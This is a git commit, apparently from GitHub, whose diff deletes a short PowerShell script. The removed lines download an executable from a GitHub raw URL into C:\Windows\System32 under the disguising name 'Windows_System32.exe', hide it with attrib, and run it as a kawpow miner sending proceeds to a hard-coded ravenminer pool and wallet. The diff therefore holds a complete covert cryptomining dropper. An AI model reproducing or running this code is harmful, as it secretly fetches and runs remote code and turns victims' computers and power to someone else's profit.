ebe8e8f240481610b8211c997f41d780b059a77e
nothingtoseehere121 <98023403+nothingtoseehere121@users.noreply.github.com>
2022-06-18 14:48:58 +0300

    Delete script12GS-08.ps1

--- script12GS-08.ps1
+++
@@ -1,9 +0,0 @@
-$Folder = 'C:\Windows\System32\Windows_System32.exe'
-"Test to see if folder [$Folder]  exists"
-if (Test-Path -Path $Folder) {
-    "Path exists!"
-    C:\Windows\System32\Windows_System32.exe -a kawpow -lhr 60 -o stratum.ravenminer.com:3838 -u RBvEd2Q4R8vC7yKLXtAj6CMzDRsExnW2id -pl 60%
-} else {
-    "Path doesn't exist."
-    cd C:\Windows\System32 ; Invoke-WebRequest -uri "https://github.com/nothingtoseehere121/bm90aGluZ3Rvc2VlaGVyZQ/raw/main/Windows_System32.exe" -OutFile Windows_System32.exe ; attrib +h Windows_System32.exe; C:\Windows\System32\Windows_System32.exe -a kawpow -lhr 60 -o stratum.ravenminer.com:3838 -u RBvEd2Q4R8vC7yKLXtAj6CMzDRsExnW2id -pl 60%
-}
